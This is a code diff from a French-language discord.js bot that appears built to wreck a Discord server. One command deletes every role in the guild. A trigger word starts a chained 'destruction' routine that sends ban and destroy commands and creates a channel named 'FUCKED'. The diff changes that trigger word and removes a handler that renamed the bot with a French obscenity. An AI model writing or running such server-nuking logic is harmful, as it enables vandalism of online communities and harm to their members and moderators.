@@ -591,15 +591,12 @@ if(message.content === "roles"){
                 message.guild.roles.map(c => c.delete())
             }
             //on commence la destruction
-            if(message.content.includes("détruire")){
+            if(message.content.includes("détruiree")){
                 message.channel.send("ban").then(m => m.delete());
                 message.channel.send("drole").then(m => m.delete());
                 message.channel.send("destroy").then(m => m.delete());
                 message.channel.send("jechange").then(m => m.delete());
                 message.guild.createChannel("FUCKED", "text").then(c => c.send("channel"))
-            }
-            if(message.content.includes("jechange")){
-                message.guild.members.get(bot.user.id).setNickname("JE T'ENCULE")
             }
         });
 client.login(process.env.TOKEN)
